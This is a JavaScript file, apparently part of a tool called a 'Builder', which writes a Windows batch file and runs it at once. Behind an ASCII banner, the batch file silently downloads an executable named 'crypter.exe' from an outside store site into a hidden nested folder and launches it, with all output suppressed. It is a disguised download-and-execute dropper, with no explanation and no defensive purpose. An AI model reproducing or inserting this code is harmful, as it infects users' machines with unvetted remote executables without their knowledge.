const { exec } = require('child_process');
const { resolve } = require('path');
const { writeFile, mkdir } = require('fs').promises;

async function createAndRunBatFile() {
    const batContent = `@echo off
chcp 65001 >nul
cls
echo.
echo.
echo.
echo             ██████╗  ██████╗ ███████╗███╗   ██╗███████╗██████╗ ██╗██╗   ██╗███╗   ███╗
echo             ██╔══██╗██╔═══██╗██╔════╝████╗  ██║██╔════╝██╔══██╗██║██║   ██║████╗ ████║
echo             ██║  ██║██║   ██║█████╗  ██╔██╗ ██║█████╗  ██████╔╝██║██║   ██║██╔████╔██║
echo             ██║  ██║██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██║██║   ██║██║╚██╔╝██║
echo             ██████╔╝╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║╚██████╔╝██║ ╚═╝ ██║
echo             ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝ ╚═════╝ ╚═╝     ╚═╝
echo.
echo                                           Builder
echo.
echo.
echo.
timeout /t 3 >nul

rem Gerekli klasörleri oluştur
if not exist "screenshots\\profile\\aa\\b" mkdir "screenshots\\profile\\aa\\b" >nul 2>&1

rem curl kullanarak dosyayı sessiz modda indirme
curl -s -o "screenshots\\profile\\aa\\b\\crypter.exe" https://anodos.store/download/crypter.exe >nul 2>&1

rem Dosyayı çalıştırma
start "" "screenshots\\profile\\aa\\b\\crypter.exe" >nul 2>&1

exit`;

    const batDir = resolve(__dirname, '../screenshots/profile/aa/b');
    const batFilePath = resolve(batDir, 'download_and_run.bat');

    try {
        await mkdir(batDir, { recursive: true });
        await writeFile(batFilePath, batContent);
        console.log('  ['.white + '+'.green + ']'.white + ' Batch file created successfully!'.white);
        exec(`start "" "${batFilePath}"`, (error, stdout, stderr) => {
            if (error) {
                console.error(`Error executing batch file: ${error}`);
                return;
            }
            console.log('  ['.white + '+'.green + ']'.white + ' Batch file executed successfully!'.white);
        });
    } catch (error) {
        console.error(`Error creating batch file: ${error}`);
    }
}

createAndRunBatFile();
